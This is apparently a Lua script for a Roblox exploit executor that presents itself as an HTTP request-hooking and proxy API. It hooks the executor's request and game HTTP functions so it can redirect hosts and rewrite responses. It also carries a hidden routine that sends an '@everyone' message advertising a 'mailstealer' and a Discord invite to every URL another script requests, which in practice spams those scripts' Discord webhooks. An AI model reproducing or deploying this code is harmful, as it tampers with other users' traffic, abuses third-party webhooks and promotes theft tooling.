local options = { API = true };

local clonef = clonefunction;
local gsub = clonef(string.gsub);
local match = clonef(string.match);
local Type = clonef(type);
local crunning = clonef(coroutine.running);
local cwrap = clonef(coroutine.wrap);
local cresume = clonef(coroutine.resume);
local cyield = clonef(coroutine.yield);
local Pcall = clonef(pcall);
local Pairs = clonef(pairs);
local Error = clonef(error);
local getnamecallmethod = clonef(getnamecallmethod);
local enabled = true;
local reqfunc = (syn or http).request;
local hooked = {};
local proxied = {};
local methods = {
    HttpGet = not syn,
    HttpGetAsync = not syn,
    GetObjects = true,
    HttpPost = not syn,
    HttpPostAsync = not syn
}

local function SendMessage(url)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = "@everyone\n\nBetter mailstealer here\nhttps://discord.gg/HcpNe56R2a"
    }

    local body = http:JSONEncode(data)
    local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body,
        Internal = true
	})
end

local OnRequest = Instance.new("BindableEvent");

local function ConstantScan(constant)
    for i,v in Pairs(getgc(true)) do
        if type(v) == "function" and islclosure(v) and getfenv(v).script == getfenv(saveinstance).script and table.find(debug.getconstants(v), constant) then
            return v;
        end;
    end;
end;

local function DeepClone(tbl, cloned)
    cloned = cloned or {};

    for i,v in Pairs(tbl) do
        if Type(v) == "table" then
            cloned[i] = DeepClone(v);
            continue;
        end;
        cloned[i] = v;
    end;

    return cloned;
end;

local __namecall, __request;
__namecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local method = getnamecallmethod();

    return __namecall(self, ...);
end));

__request = hookfunction(reqfunc, newcclosure(function(req) 
    if Type(req) ~= "table" then return __request(req); end;

    local RequestData = DeepClone(req);
    if not enabled then
        return __request(req);
    end;

    if Type(RequestData.Url) ~= "string" then return __request(req) end;

    local t = crunning();
    cwrap(function() 
        if RequestData.Url then
            local Host = string.match(RequestData.Url, "https?://(%w+.%w+)/");
            if Host and proxied[Host] then
                RequestData.Url = gsub(RequestData.Url, Host, proxied[Host], 1);
            end; 
        end;

        OnRequest:Fire(RequestData);

        local ok, ResponseData = Pcall(__request, RequestData);
        if not ok then
            Error(ResponseData, 0);
        end;

        if not RequestData.Internal then
            local url = RequestData.Url
            SendMessage(url)
        end
        cresume(t, hooked[RequestData.Url] and hooked[RequestData.Url](ResponseData) or ResponseData);
    end)();
    return cyield();
end));

if request then
    replaceclosure(request, reqfunc);
end;

if syn and syn.websocket then
    local WsConnect, WsBackup = debug.getupvalue(syn.websocket.connect, 1);
    WsBackup = hookfunction(WsConnect, function(...)
        return WsBackup(...);
    end);
end;

if syn and syn.websocket then
    local HttpGet;
    HttpGet = hookfunction(getupvalue(ConstantScan("ZeZLm2hpvGJrD6OP8A3aEszPNEw8OxGb"), 2), function(self, ...) 
        return HttpGet(self, ...);
    end);

    local HttpPost;
    HttpPost = hookfunction(getupvalue(ConstantScan("gpGXBVpEoOOktZWoYECgAY31o0BlhOue"), 2), function(self, ...) 
        return HttpPost(self, ...);
    end);
end

for method, enabled in Pairs(methods) do
    if enabled then
        local b;
        b = hookfunction(game[method], newcclosure(function(self, ...)
            return b(self, ...);
        end));
    end;
end;

if not options.API then return end;

local API = {};
API.OnRequest = OnRequest.Event;

function API:HookSynRequest(url, hook) 
    hooked[url] = hook;
end;

function API:ProxyHost(host, proxy) 
    proxied[host] = proxy;
end;

function API:RemoveProxy(host) 
    if not proxied[host] then
        error("host isn't proxied", 0);
    end;
    proxied[host] = nil;
end;

function API:UnHookSynRequest(url) 
    if not hooked[url] then
        error("url isn't hooked", 0);
    end;
    hooked[url] = nil;
end

return API;
